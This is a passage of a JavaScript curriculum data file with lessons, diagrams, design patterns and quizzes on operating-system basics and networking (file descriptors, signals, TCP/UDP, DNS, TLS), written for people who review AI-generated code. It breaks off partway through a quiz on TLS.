window.CURRICULUM_SECTIONS = window.CURRICULUM_SECTIONS || [];
window.CURRICULUM_SECTIONS.push({
  "id": "systems",
  "title": "Systems & the Web",
  "tagline": "What actually happens between your code, the OS, the network, and the data.",
  "intro": "Every program you ship runs as a process on an operating system, talks over a network, stores data in a database, and faces hostile input. AI agents write code that looks right in isolation, but they routinely get these system-level details wrong: leaked file descriptors, unsafe retries, missing indexes, string-built SQL. This section gives you the mental models to spot those mistakes in review.",
  "topics": [
    {
      "id": "os-essentials",
      "title": "Operating Systems Essentials",
      "minutes": 9,
      "summary": "Processes, threads, file descriptors, syscalls, signals and environment variables: what your program really runs on.",
      "lesson": [
        {
          "type": "p",
          "text": "Your server works on your laptop, then in production it dies with `Too many open files`, or it ignores a deploy because it never shuts down cleanly. These are operating system problems, not logic bugs. The OS is the layer that shares one machine among many programs, and every program you write talks to it constantly, usually without you noticing."
        },
        {
          "type": "h",
          "text": "Processes and threads"
        },
        {
          "type": "p",
          "text": "A **process** is a running program with its own private virtual address space, its own file descriptor table, and its own environment. Processes are isolated: one process cannot read another's memory, so a crash in one does not corrupt another. A **thread** is a unit of execution inside a process. Threads in the same process share memory, which makes communication cheap but also makes data races possible. The kernel schedules threads onto CPU cores, switching between them many times per second (a **context switch**)."
        },
        {
          "type": "list",
          "items": [
            "Process: isolation, own memory, expensive to create, communicate via pipes, sockets, files.",
            "Thread: shared memory, cheap to create, needs locks or message passing to be safe.",
            "Async/event-loop code (Node, asyncio) runs many tasks on one thread by never blocking; it helps with waiting on I/O, not with CPU-heavy work."
          ]
        },
        {
          "type": "h",
          "text": "Syscalls: the only door to the kernel"
        },
        {
          "type": "p",
          "text": "User programs cannot touch disks, networks or other processes directly. They ask the kernel through **system calls** such as `open`, `read`, `write`, `fork`, `execve`, `socket`, `mmap`. A syscall crosses from user mode into kernel mode, which is far more expensive than a normal function call. Standard library functions like Python's `open()` or Node's `fs.readFile` are wrappers over syscalls. This is why reading a file one byte at a time is slow: you pay the syscall cost per byte."
        },
        {
          "type": "h",
          "text": "File descriptors: everything is a handle"
        },
        {
          "type": "p",
          "text": "On Unix-like systems, an open file, a pipe, and a network socket are all referenced by a small integer called a **file descriptor** (fd). Each process starts with 0 (stdin), 1 (stdout) and 2 (stderr). The OS caps how many fds a process may hold (`ulimit -n`, often 1024 by default on Linux). If you open sockets or files and never close them, you eventually hit the cap and every new `open` or `accept` fails. This is a **file descriptor leak**."
        },
        {
          "type": "code",
          "lang": "python",
          "text": "# Leaky: if parse() raises, f is never closed until garbage collection\ndef read_config(path):\n    f = open(path)\n    data = parse(f.read())\n    f.close()\n    return data\n\n# Correct: the context manager closes the fd on every path\ndef read_config(path):\n    with open(path) as f:\n        return parse(f.read())"
        },
        {
          "type": "h",
          "text": "Signals and graceful shutdown"
        },
        {
          "type": "p",
          "text": "A **signal** is a small asynchronous notification sent to a process. `SIGTERM` (15) politely asks it to exit and can be handled; `SIGINT` is Ctrl+C; `SIGKILL` (9) cannot be caught or ignored and kills immediately, with no cleanup. When Kubernetes or a process manager stops your service, it sends `SIGTERM`, waits a grace period, then sends `SIGKILL`. A well-behaved server catches `SIGTERM`, stops accepting new requests, finishes in-flight ones, flushes buffers, and exits."
        },
        {
          "type": "code",
          "lang": "python",
          "text": "import signal, sys\n\ndef shutdown(signum, frame):\n    server.stop_accepting()\n    server.drain(timeout=20)\n    sys.exit(0)\n\nsignal.signal(signal.SIGTERM, shutdown)"
        },
        {
          "type": "figure",
          "id": "systems-graceful-shutdown",
          "caption": "SIGTERM starts the clock: stop accepting, let in-flight requests finish, and exit well inside the grace period, because SIGKILL does no cleanup.",
          "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 640 280\" role=\"img\" aria-label=\"Timeline: SIGTERM at 0 s, three in-flight requests finish while new requests are refused, the process exits at 12 s, inside the 20 s drain timeout and well before SIGKILL at 30 s\"> <style>.systems-graceful-shutdown-t{font-size:14px;fill:var(--fig-ink)} .systems-graceful-shutdown-b{font-size:14px;font-weight:600;fill:var(--fig-ink)} .systems-graceful-shutdown-m{font-size:13px;fill:var(--fig-muted)} .systems-graceful-shutdown-mono{font-family:ui-monospace,Menlo,monospace} .systems-graceful-shutdown-mid{text-anchor:middle}.systems-graceful-shutdown-end{text-anchor:end} .systems-graceful-shutdown-ln{stroke:var(--fig-line);stroke-width:1.5;fill:none} .systems-graceful-shutdown-dash{stroke-dasharray:4 4} .systems-graceful-shutdown-box{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-graceful-shutdown-halo{paint-order:stroke;stroke:var(--fig-bg);stroke-width:4px;stroke-linejoin:round} .systems-graceful-shutdown-acc{fill:var(--fig-accent)}.systems-graceful-shutdown-badt{fill:var(--fig-bad)} .systems-graceful-shutdown-req{fill:var(--fig-accent);fill-opacity:.18;stroke:var(--fig-accent);stroke-width:1.5} .systems-graceful-shutdown-refused{fill:var(--fig-bad);fill-opacity:.1;stroke:var(--fig-bad);stroke-width:1.5;stroke-dasharray:5 4} .systems-graceful-shutdown-proc{fill:var(--fig-ok);fill-opacity:.16;stroke:var(--fig-ok);stroke-width:1.5} .systems-graceful-shutdown-exit{fill:var(--fig-ok)} .systems-graceful-shutdown-vt{stroke:var(--fig-accent);stroke-width:2}.systems-graceful-shutdown-vk{stroke:var(--fig-bad);stroke-width:2} .systems-graceful-shutdown-head{stroke:var(--fig-accent2);stroke-width:2;opacity:0;animation:systems-graceful-shutdown-move 7s linear infinite} .systems-graceful-shutdown-elapsed{fill:var(--fig-accent2);fill-opacity:.07;opacity:0;transform-box:fill-box;transform-origin:0 0;animation:systems-graceful-shutdown-grow 7s linear infinite} @keyframes systems-graceful-shutdown-move{0%{transform:translateX(0);opacity:1}85%{transform:translateX(560px);opacity:1}100%{transform:translateX(560px);opacity:1}} @keyframes systems-graceful-shutdown-grow{0%{transform:scaleX(0);opacity:1}85%{transform:scaleX(1);opacity:1}100%{transform:scaleX(1);opacity:1}}</style> <text class=\"systems-graceful-shutdown-m systems-graceful-shutdown-mid\" x=\"360\" y=\"28\">grace period (Kubernetes default 30 s)</text><path class=\"systems-graceful-shutdown-ln\" d=\"M120 46V38H600V46\"/><rect class=\"systems-graceful-shutdown-elapsed\" x=\"40\" y=\"70\" width=\"560\" height=\"170\" rx=\"4\"/><text class=\"systems-graceful-shutdown-b systems-graceful-shutdown-acc\" x=\"124\" y=\"62\">SIGTERM</text><text class=\"systems-graceful-shutdown-m systems-graceful-shutdown-end\" x=\"436\" y=\"62\">drain(timeout=20)</text><text class=\"systems-graceful-shutdown-b systems-graceful-shutdown-badt systems-graceful-shutdown-end\" x=\"596\" y=\"62\">SIGKILL</text><rect class=\"systems-graceful-shutdown-req\" x=\"56\" y=\"80\" width=\"112\" height=\"18\" rx=\"6\"/><rect class=\"systems-graceful-shutdown-req\" x=\"88\" y=\"106\" width=\"160\" height=\"18\" rx=\"6\"/><rect class=\"systems-graceful-shutdown-req\" x=\"104\" y=\"132\" width=\"208\" height=\"18\" rx=\"6\"/><text class=\"systems-graceful-shutdown-m\" x=\"178\" y=\"94\">in-flight requests finish</text><rect class=\"systems-graceful-shutdown-refused\" x=\"120\" y=\"162\" width=\"480\" height=\"22\" rx=\"6\"/><text class=\"systems-graceful-shutdown-m\" x=\"132\" y=\"177\">stop_accepting(): new requests refused</text><rect class=\"systems-graceful-shutdown-proc\" x=\"40\" y=\"198\" width=\"272\" height=\"22\" rx=\"6\"/><text class=\"systems-graceful-shutdown-t\" x=\"132\" y=\"214\">process alive</text><circle class=\"systems-graceful-shutdown-exit\" cx=\"312\" cy=\"209\" r=\"5\"/><text class=\"systems-graceful-shutdown-t\" x=\"324\" y=\"214\">exits at 12 s</text><path class=\"systems-graceful-shutdown-vt\" d=\"M120 70V240\"/><path class=\"systems-graceful-shutdown-ln systems-graceful-shutdown-dash\" d=\"M440 70V240\"/><path class=\"systems-graceful-shutdown-vk\" d=\"M600 70V240\"/><path class=\"systems-graceful-shutdown-ln\" d=\"M40 240H600\"/><path class=\"systems-graceful-shutdown-ln\" d=\"M120 240V246\"/><text class=\"systems-graceful-shutdown-m systems-graceful-shutdown-mid\" x=\"120\" y=\"262\">0 s</text><path class=\"systems-graceful-shutdown-ln\" d=\"M280 240V246\"/><text class=\"systems-graceful-shutdown-m systems-graceful-shutdown-mid\" x=\"280\" y=\"262\">10 s</text><path class=\"systems-graceful-shutdown-ln\" d=\"M440 240V246\"/><text class=\"systems-graceful-shutdown-m systems-graceful-shutdown-mid\" x=\"440\" y=\"262\">20 s</text><path class=\"systems-graceful-shutdown-ln\" d=\"M600 240V246\"/><text class=\"systems-graceful-shutdown-m systems-graceful-shutdown-mid\" x=\"600\" y=\"262\">30 s</text><path class=\"systems-graceful-shutdown-head\" d=\"M40 70V240\"/> </svg>"
        },
        {
          "type": "h",
          "text": "Environment variables"
        },
        {
          "type": "p",
          "text": "Each process has a set of key-value strings called its **environment**, inherited by child processes at creation. This is the standard way to pass configuration (ports, database URLs, feature flags) into a program without baking it into code. Two rules matter: values are always strings (so `\"false\"` is truthy in many languages if you forget to parse it), and changes in a child never propagate back to its parent. Running `export FOO=1` in one terminal does not affect another."
        },
        {
          "type": "p",
          "text": "Common misconceptions: threads are not always faster (the Python GIL, lock contention and context switching can make more threads slower); `kill` does not necessarily kill, it sends a signal, which defaults to `SIGTERM`; and a zombie process is a finished child whose parent has not yet collected its exit status, not a running one."
        },
        {
          "type": "callout",
          "kind": "agent",
          "text": "Agents write code that passes a single test run, so they rarely think about resource lifetimes. In review, check that every opened file, socket, DB connection and subprocess is closed on all paths (context managers, `try/finally`), that long-running services handle `SIGTERM`, and that secrets come from the environment rather than being hard-coded. When debugging, tell the agent the exact error and ask it to run `lsof -p <pid>` or `ulimit -n` rather than guessing."
        },
        {
          "type": "callout",
          "kind": "tip",
          "text": "Useful first-aid commands: `ps aux` (what is running), `lsof -i :8080` (who owns a port), `strace -c` or `dtruss` (which syscalls a program makes), `env` (what your process inherited)."
        },
        {
          "type": "patterns",
          "patterns": [
            {
              "signal": "Deploys drop in-flight requests, or the orchestrator has to SIGKILL the service after the grace period",
              "use": "Graceful shutdown on SIGTERM",
              "why": "Catch SIGTERM, stop accepting work, drain in-flight requests, flush and close, then exit. Keep the drain shorter than the grace period, because SIGKILL cannot be caught."
            },
            {
              "signal": "A service runs for hours, then fails with `Too many open files` while CPU and memory look normal",
              "use": "Scoped resource cleanup",
              "why": "Close files, sockets and pipes on every path with `try/finally`, `using` or `with`. Descriptors are a per-process limit; raising `ulimit` only delays a leak."
            },
            {
              "signal": "One misbehaving worker or plugin must not crash or corrupt the others",
              "use": "Separate processes",
              "why": "Processes get isolated memory, so a crash stays contained and the OS reclaims its resources. You pay in memory and IPC cost, since data must be copied or shared explicitly."
            },
            {
              "signal": "Tasks need to share a large in-memory data set and hand work to each other cheaply",
              "use": "Threads in one process",
              "why": "Threads share the address space, so no copying or IPC. Every shared mutable value now needs synchronization, and one thread's crash takes down the whole process."
            },
            {
              "signal": "Two threads update a shared counter without a lock and the total is sometimes too low",
              "use": "Lock or atomic operation",
              "why": "`count++` is read-modify-write; interleaved threads lose updates. A mutex or atomic increment makes it indivisible. Keep critical sections short to limit contention."
            },
            {
              "signal": "A profile or `strace` shows millions of tiny `read`/`write` syscalls and the I/O loop is slow",
              "use": "Buffered I/O",
              "why": "Each syscall crosses into the kernel and costs far more than a function call. A buffer turns many small calls into few large ones. Flush explicitly where durability or latency matters."
            },
            {
              "signal": "A producer outpaces its consumer and memory grows steadily in an in-process queue",
              "use": "Backpressure via bounded queue",
              "why": "A bounded queue blocks, slows or rejects the producer when full, so overload becomes visible instead of an eventual OOM. You must choose: block, drop or shed with an error."
            },
            {
              "signal": "Thread-per-connection server runs out of memory with thousands of mostly idle connections",
              "use": "Event loop with non-blocking I/O",
              "why": "One thread multiplexes many sockets via `epoll`/`kqueue`, so idle connections cost almost nothing. CPU-heavy or blocking calls on the loop stall everyone; offload them to a worker pool."
            },
            {
              "signal": "URLs, ports and feature flags are hardcoded and differ between staging and production builds",
              "use": "Environment variable configuration",
              "why": "Same artifact, different config per environment. Values are inherited strings read at start, so parse and validate them on boot and fail fast; changes need a restart."
            }
          ]
        }
      ],
      "keyPoints": [
        "A process owns isolated memory and resources; threads share a process's memory and need synchronization.",
        "Programs reach the kernel only through syscalls, which are costly, so batch and buffer I/O.",
        "Files, pipes and sockets are all file descriptors, a limited resource that must be closed on every code path.",
        "SIGTERM allows graceful shutdown; SIGKILL cannot be caught.",
        "Environment variables are inherited, string-typed configuration."
      ],
      "quiz": [
        {
          "q": "A service runs fine for hours, then every new connection fails with `Too many open files`. Memory and CPU look normal. What is the most likely cause?",
          "options": [
            "Sockets or files are opened but not closed on some code path (an fd leak)",
            "The kernel ran out of physical RAM and is refusing new allocations",
            "Thread context switches are starving the accept loop of CPU time",
            "A client disconnected early and the process received SIGPIPE"
          ],
          "answer": 0,
          "explain": "Sockets and files consume file descriptors, which have a per-process cap. Normal memory and CPU with this specific error points to leaked fds, not RAM, scheduling or a single signal."
        },
        {
          "q": "Why does a container orchestrator send SIGTERM before SIGKILL when stopping your service?",
          "options": [
            "SIGTERM is delivered faster, so shutdown finishes before traffic is rerouted",
            "SIGTERM can be caught, letting the process drain in-flight work and clean up",
            "SIGKILL only stops the main thread, so SIGTERM is needed for the workers",
            "SIGTERM makes the kernel close every file descriptor before exit"
          ],
          "answer": 1,
          "explain": "SIGTERM is catchable, enabling graceful shutdown. SIGKILL cannot be caught, so it is the last resort after the grace period expires. Both signals end the whole process, and the kernel closes fds on any exit."
        },
        {
          "q": "Two worker threads in one process increment a shared counter with no lock, and the final value is sometimes too low. Which statement best explains this?",
          "options": [
            "Each thread works on a private copy, and only one copy is kept at exit",
            "The OS isolates thread memory, so one thread's writes are invisible",
            "The threads' unsynchronized read-modify-write steps interleave and lose updates",
            "Each increment is a syscall, and the kernel drops concurrent writes"
          ],
          "answer": 2,
          "explain": "Threads share an address space, so concurrent read-modify-write sequences can interleave. Processes, not threads, have isolated memory, and a plain increment is not a syscall."
        },
        {
          "q": "A script reads a 100 MB file by calling `read(1)` on an unbuffered file descriptor, one byte at a time, and is extremely slow. What is the main reason?",
          "options": [
            "Each read opens a new file descriptor, which fills the fd table",
            "Each call is a separate syscall, so the kernel-crossing cost is paid per byte",
            "Single-byte reads bypass the kernel page cache and hit the disk",
            "Each single-byte read triggers a SIGPIPE that must be handled"
          ],
          "answer": 1,
          "explain": "Every unbuffered read crosses into the kernel. Buffered or chunked reads amortize that cost across many bytes. The page cache still serves the data; the fd is reused; no signal is involved."
        },
        {
          "q": "You run `export API_URL=staging.example.com` in terminal A. A program started later in terminal B (a separate shell) reads `API_URL`. What does it see?",
          "options": [
            "staging.example.com, because export writes to a machine-wide table",
            "Not A's value: the variable lives in A's shell and passes only to its children",
            "staging.example.com, but only if program B is started with sudo",
            "staging.example.com, once terminal B runs `source ~/.bashrc`"
          ],
          "answer": 1,
          "explain": "The environment belongs to a process and is copied to its children. Terminal B's shell never inherited A's export, and the export was never written to any startup file."
        },
        {
          "q": "An ingest service reads from sockets faster than its database writer can store rows. The in-process queue between them grows by about 200 MB per hour until the process is OOM-killed. What should you reach for?",
          "options": [
            "Give the process a larger heap so it lasts longer between restarts",
            "Bound the queue so that a full queue blocks or rejects the reader",
            "Run more reader threads so more data reaches the queue sooner",
            "Flush the queue to disk on every insert so memory stays flat"
          ],
          "answer": 1,
          "explain": "A bounded queue turns overload into visible backpressure instead of an eventual crash. A bigger heap only delays the failure, and more readers make the producer even faster."
        }
      ]
    },
    {
      "id": "networking",
      "title": "Networking",
      "minutes": 10,
      "summary": "IP, TCP vs UDP, DNS, ports, TLS, and the full journey of a URL from keystroke to rendered page.",
      "lesson": [
        {
          "type": "p",
          "text": "A user reports that your site is slow, but only the first load, and only from another continent. To reason about that you need to know what happens before a single byte of your application code runs. Networking is a stack of layers, each solving one problem and hiding its details from the layer above."
        },
        {
          "type": "h",
          "text": "IP and ports: addressing"
        },
        {
          "type": "p",
          "text": "An **IP address** identifies a network interface (IPv4 like `203.0.113.7`, IPv6 like `2001:db8::1`). IP delivers packets on a best-effort basis: they may be dropped, duplicated, reordered or delayed. A **port** (0-65535) identifies which program on that machine should receive the packet. So a connection endpoint is an IP plus a port, and a TCP connection is identified by the four-tuple of source IP, source port, destination IP, destination port. Well-known ports: 80 HTTP, 443 HTTPS, 22 SSH, 5432 Postgres."
        },
        {
          "type": "p",
          "text": "`localhost` or `127.0.0.1` is the loopback interface: traffic never leaves the machine. Binding a server to `127.0.0.1` makes it unreachable from other hosts; binding to `0.0.0.0` listens on all interfaces, which is what a container usually needs, and also what accidentally exposes a dev database to the world."
        },
        {
          "type": "h",
          "text": "TCP vs UDP"
        },
        {
          "type": "list",
          "items": [
            "**TCP**: connection-oriented, reliable, ordered byte stream. It uses a handshake (SYN, SYN-ACK, ACK), acknowledgements, retransmission, and congestion control. Costs: setup latency and head-of-line blocking (one lost packet stalls later data). Used by HTTP/1.1, HTTP/2, databases, SSH.",
            "**UDP**: connectionless datagrams, no delivery or ordering guarantee, minimal overhead. Used for DNS lookups, real-time voice/video, games, and as the base of QUIC (HTTP/3), which rebuilds reliability and encryption on top of UDP to avoid TCP's head-of-line blocking."
          ]
        },
        {
          "type": "p",
          "text": "Choose by what a late packet means. If an old game position update is worthless, UDP lets you drop it. If a bank transfer message is lost, you need TCP's guarantees."
        },
        {
          "type": "h",
          "text": "DNS: names to addresses"
        },
        {
          "type": "p",
          "text": "Humans use names; IP needs addresses. **DNS** is a distributed, hierarchical database. Your machine asks a **recursive resolver** (usually your ISP or a public one), which walks from the root servers to the `.com` servers to the domain's authoritative server, then caches the answer for the record's **TTL**. Record types: `A`/`AAAA` (name to IPv4/IPv6), `CNAME` (alias), `MX` (mail), `TXT` (verification, SPF). Caching is why DNS changes take time to propagate: resolvers hold the old answer until the TTL expires."
        },
        {
          "type": "h",
          "text": "TLS: encryption and identity"
        },
        {
          "type": "p",
          "text": "**TLS** sits on top of TCP (or inside QUIC) and gives three properties: confidentiality (eavesdroppers see ciphertext), integrity (tampering is detected), and authentication (the server proves it owns the domain via a certificate signed by a trusted certificate authority). During the handshake the client and server agree on parameters, the server presents its certificate, and both derive shared session keys using key exchange. TLS 1.3 completes this in one round trip."
        },
        {
          "type": "h",
          "text": "What happens when you type a URL"
        },
        {
          "type": "code",
          "lang": "text",
          "text": "1. Browser parses https://shop.example.com/cart\n2. Checks caches (HTTP cache, HSTS list)\n3. DNS: shop.example.com -> 203.0.113.7 (resolver, TTL cache)\n4. TCP handshake to 203.0.113.7:443 (1 round trip)\n5. TLS handshake: certificate check, key exchange (1 round trip in TLS 1.3)\n6. HTTP request: GET /cart  Host: shop.example.com\n7. Server (often behind CDN / load balancer) returns HTML\n8. Browser parses HTML, fetches CSS/JS/images (repeat 3-6 as needed)\n9. Render"
        },
        {
          "type": "p",
          "text": "Back to the slow first load from another continent: DNS lookup plus TCP plus TLS cost several round trips, each one paying the long-distance latency. Repeat visits reuse connections and caches. CDNs and connection reuse exist to cut exactly these costs."
        },
        {
          "type": "figure",
          "id": "systems-first-load",
          "caption": "On a first visit, DNS, TCP, TLS and HTTP each cost a round trip before any HTML arrives; from another continent every one pays the full distance.",
          "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 640 384\" role=\"img\" aria-label=\"Sequence diagram of a first page load: a DNS lookup to the resolver, then TCP, TLS 1.3 and HTTP round trips to the server, four round trips before the first byte of HTML\"> <style>.systems-first-load-t{font-size:14px;fill:var(--fig-ink)} .systems-first-load-b{font-size:14px;font-weight:600;fill:var(--fig-ink)} .systems-first-load-m{font-size:13px;fill:var(--fig-muted)} .systems-first-load-mono{font-family:ui-monospace,Menlo,monospace} .systems-first-load-mid{text-anchor:middle}.systems-first-load-end{text-anchor:end} .systems-first-load-ln{stroke:var(--fig-line);stroke-width:1.5;fill:none} .systems-first-load-dash{stroke-dasharray:4 4} .systems-first-load-box{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-first-load-halo{paint-order:stroke;stroke:var(--fig-bg);stroke-width:4px;stroke-linejoin:round} .systems-first-load-q{stroke:var(--fig-accent);stroke-width:1.75;fill:none;marker-end:url(#systems-first-load-a1)} .systems-first-load-r{stroke:var(--fig-accent2);stroke-width:1.75;fill:none;marker-end:url(#systems-first-load-a2)} .systems-first-load-f1{fill:var(--fig-accent)}.systems-first-load-f2{fill:var(--fig-accent2)} .systems-first-load-dot{fill:var(--fig-ink);opacity:0;animation:systems-first-load-hop 8s linear infinite} @keyframes systems-first-load-hop{0%{transform:translate(200px,64px);opacity:1}6.6%{transform:translate(330px,90px);opacity:1}13.3%{transform:translate(200px,116px);opacity:1}16.1%{transform:translate(200px,134px);opacity:1}27.1%{transform:translate(570px,160px);opacity:1}38.2%{transform:translate(200px,186px);opacity:1}41%{transform:translate(200px,204px);opacity:1}52%{transform:translate(570px,230px);opacity:1}63.1%{transform:translate(200px,256px);opacity:1}65.9%{transform:translate(200px,274px);opacity:1}76.9%{transform:translate(570px,300px);opacity:1}88%{transform:translate(200px,326px);opacity:1}88.1%{transform:translate(200px,326px);opacity:0}100%{transform:translate(200px,326px);opacity:0}}</style> <defs><marker id=\"systems-first-load-a1\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-first-load-f1\"/></marker><marker id=\"systems-first-load-a2\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-first-load-f2\"/></marker></defs><path class=\"systems-first-load-ln systems-first-load-dash\" d=\"M200 42V340\"/><rect class=\"systems-first-load-box\" x=\"145\" y=\"12\" width=\"110\" height=\"30\" rx=\"8\"/><text class=\"systems-first-load-t systems-first-load-mid\" x=\"200\" y=\"32\">Browser</text><path class=\"systems-first-load-ln systems-first-load-dash\" d=\"M330 42V340\"/><rect class=\"systems-first-load-box\" x=\"275\" y=\"12\" width=\"110\" height=\"30\" rx=\"8\"/><text class=\"systems-first-load-t systems-first-load-mid\" x=\"330\" y=\"32\">DNS resolver</text><path class=\"systems-first-load-ln systems-first-load-dash\" d=\"M570 42V340\"/><rect class=\"systems-first-load-box\" x=\"515\" y=\"12\" width=\"110\" height=\"30\" rx=\"8\"/><text class=\"systems-first-load-t systems-first-load-mid\" x=\"570\" y=\"32\">Server :443</text><path class=\"systems-first-load-q\" d=\"M200 64L330 90\"/><path class=\"systems-first-load-r\" d=\"M330 90L200 116\"/><text class=\"systems-first-load-m\" x=\"342\" y=\"94\">shop.example.com → 203.0.113.7</text><text class=\"systems-first-load-t\" x=\"16\" y=\"88\">DNS lookup</text><text class=\"systems-first-load-m\" x=\"16\" y=\"106\">1 round trip</text><path class=\"systems-first-load-q\" d=\"M200 134L570 160\"/><path class=\"systems-first-load-r\" d=\"M570 160L200 186\"/><text class=\"systems-first-load-m systems-first-load-mid\" x=\"450\" y=\"141.6\">SYN</text><text class=\"systems-first-load-m systems-first-load-mid\" x=\"450\" y=\"187.4\">SYN-ACK</text><text class=\"systems-first-load-t\" x=\"16\" y=\"158\">TCP handshake</text><text class=\"systems-first-load-m\" x=\"16\" y=\"176\">1 round trip</text><path class=\"systems-first-load-q\" d=\"M200 204L570 230\"/><path class=\"systems-first-load-r\" d=\"M570 230L200 256\"/><text class=\"systems-first-load-m systems-first-load-mid\" x=\"450\" y=\"211.6\">ACK + ClientHello</text><text class=\"systems-first-load-m systems-first-load-mid\" x=\"450\" y=\"257.4\">ServerHello + certificate</text><text class=\"systems-first-load-t\" x=\"16\" y=\"228\">TLS 1.3 handshake</text><text class=\"systems-first-load-m\" x=\"16\" y=\"246\">1 round trip</text><path class=\"systems-first-load-q\" d=\"M200 274L570 300\"/><path class=\"systems-first-load-r\" d=\"M570 300L200 326\"/><text class=\"systems-first-load-m systems-first-load-mid\" x=\"450\" y=\"281.6\">GET /cart</text><text class=\"systems-first-load-m systems-first-load-mid\" x=\"450\" y=\"327.4\">200 OK + HTML</text><text class=\"systems-first-load-t\" x=\"16\" y=\"298\">HTTP GET /cart</text><text class=\"systems-first-load-m\" x=\"16\" y=\"316\">1 round trip</text><text class=\"systems-first-load-t systems-first-load-mid\" x=\"320\" y=\"366\">4 round trips before the first byte of HTML arrives</text><circle class=\"systems-first-load-dot\" r=\"6\"/> </svg>"
        },
        {
          "type": "p",
          "text": "Common misconceptions: HTTPS does not hide which domain you visit from the network (DNS and the SNI field can leak it unless encrypted DNS or ECH is used); a valid certificate proves the domain identity, not that the site is trustworthy; and a failed `ping` does not prove a host is down, since ICMP is often blocked."
        },
        {
          "type": "callout",
          "kind": "agent",
          "text": "When an agent debugs 'connection refused', 'timeout' and 'certificate' errors, make it distinguish them: refused means nothing is listening (wrong port or bind address), timeout means packets are dropped (firewall, wrong route), a certificate error means TLS identity failed. Ask it to run `curl -v`, `dig`, and `nc -vz host port` to gather evidence first. Watch for agents 'fixing' certificate errors by turning off certificate checking in the client; reject that."
        },
        {
          "type": "patterns",
          "patterns": [
            {
              "signal": "Each outgoing request opens a new connection and traces show DNS, TCP and TLS handshakes dominating latency",
              "use": "Connection pooling with keep-alive",
              "why": "Reusing warm connections skips several round trips per call. Cap the pool size, and set idle timeouts below the server's so you never reuse a socket the peer already closed."
            },
            {
              "signal": "A client sends hundreds of tiny messages per second, each as its own request or packet",
              "use": "Batching",
              "why": "Fixed per-message overhead (headers, round trips, syscalls) is paid once per batch. Flush on size or a short timer so batching never adds unbounded latency."
            },
            {
              "signal": "Game state is sent 60 times per second and a late update is useless because a newer one follows",
              "use": "UDP with latest-state-wins",
              "why": "TCP would stall fresh data behind a retransmitted stale packet. Over UDP, tag messages with a sequence number and drop older ones; add your own reliability only for events that need it."
            },
            {
              "signal": "A real-time TCP stream has small writes that arrive in bursts with roughly 40 ms extra delay",
              "use": "Disable Nagle with `TCP_NODELAY`",
              "why": "Nagle's algorithm holds small segments until the previous one is ACKed, which combines badly with delayed ACKs. Disabling it cuts latency but sends more packets, so batch writes yourself."
            },
            {
              "signal": "A DNS record was changed but some clients keep reaching the old server for an hour",
              "use": "Lower the TTL before migrating",
              "why": "Resolvers cache records for the TTL, so drop it to minutes a full TTL before the change and keep the old server serving until traffic drains. Low TTLs mean more lookups."
            },
            {
              "signal": "A client fails with a certificate error and someone proposes `verify=False` to make it work",
              "use": "Fix the trust chain, keep verification",
              "why": "Without verification TLS still encrypts but no longer proves who you talk to, so any man-in-the-middle wins. Install the missing CA or intermediate, or fix the hostname instead."
            },
            {
              "signal": "A connection fails and you must decide where to look: refused immediately vs hangs until timeout",
              "use": "Diagnose by failure mode",
              "why": "Refused means the host answered but nothing listens on that port. A hang usually means a firewall drops packets or the host is unreachable. Each points to a different layer."
            },
            {
              "signal": "A server in a container listens on `127.0.0.1` and port-mapped requests from the host fail",
              "use": "Bind to `0.0.0.0` in the container",
              "why": "Loopback inside the container is not the host's loopback, so forwarded traffic never reaches it. Bind all interfaces there and restrict exposure with the port mapping or a firewall."
            },
            {
              "signal": "Users far from the data centre see slow page loads even though server processing time is small",
              "use": "CDN and edge termination",
              "why": "A page load costs several round trips; terminating TCP and TLS at a nearby edge and caching static assets there shortens each one. Dynamic, per-user responses gain less."
            }
          ]
        }
      ],
      "keyPoints": [
        "IP gets packets to a host, ports select a program; IP itself is unreliable.",
        "TCP gives reliable ordered streams at a latency cost; UDP gives fast, unreliable datagrams; QUIC rebuilds reliability over UDP.",
        "DNS maps names to addresses through cached, hierarchical lookups governed by TTLs.",
        "TLS provides encryption, integrity and server authentication; never disable certificate verification to fix errors.",
        "A page load costs several round trips (DNS, TCP, TLS, HTTP), so latency and connection reuse matter."
      ],
      "quiz": [
        {
          "q": "You are building a live multiplayer game where player positions are sent 60 times per second. A position that arrives late is useless because a newer one follows. Which transport suits this best?",
          "options": [
            "TCP, since in-order delivery keeps every client's view exact",
            "TCP, since its congestion control gives the lowest latency",
            "UDP, since stale updates can be skipped without retransmission stalls",
            "ICMP, since it skips the transport layer and has less overhead"
          ],
          "answer": 2,
          "explain": "TCP would retransmit and delay newer data behind a lost old packet. For stale-tolerant real-time data, UDP's lack of delivery and ordering guarantees is a feature."
        },
        {
          "q": "A teammate changes a DNS A record to a new server IP. Some new visitors still reach the old server for an hour. What is the most likely explanation?",
          "options": [
            "Resolvers cached the old answer and serve it until the record's TTL expires",
            "Root DNS servers publish zone changes only on a fixed hourly schedule",
            "Browsers keep using the old IP until the user clears the site's cookies",
            "The new server's certificate is not yet trusted, so browsers fall back"
          ],
          "answer": 0,
          "explain": "DNS answers are cached for the record's TTL. Lowering the TTL before a planned change shortens this window. Root servers do not hold your records, and cookies and certificates do not choose the IP."
        },
        {
          "q": "`curl` to your service returns 'Connection refused' immediately. Which is the most likely interpretation?",
          "options": [
            "A firewall is silently dropping packets before they reach the host",
            "The server's TLS certificate expired, so the handshake was aborted",
            "The hostname has no DNS record, so there was no address to connect to",
            "The host answered, but no process is listening on that port or address"
          ],
          "answer": 3,
          "explain": "Refused means the host actively rejected the connection, typically because nothing listens there. A firewall that drops packets usually causes a timeout instead; DNS failure and expired certs give different errors."
        },
        {
          "q": "Which statement about TLS is accurate?",
          "options": [
            "It verifies that the site's owner is a legitimate, honest business",
            "It encrypts traffic and lets the client verify the server's domain certificate",
            "It hides both the destination IP address and domain from the network",
            "It sanitizes request bodies, protecting the server from injection"
          ],
          "answer": 1,
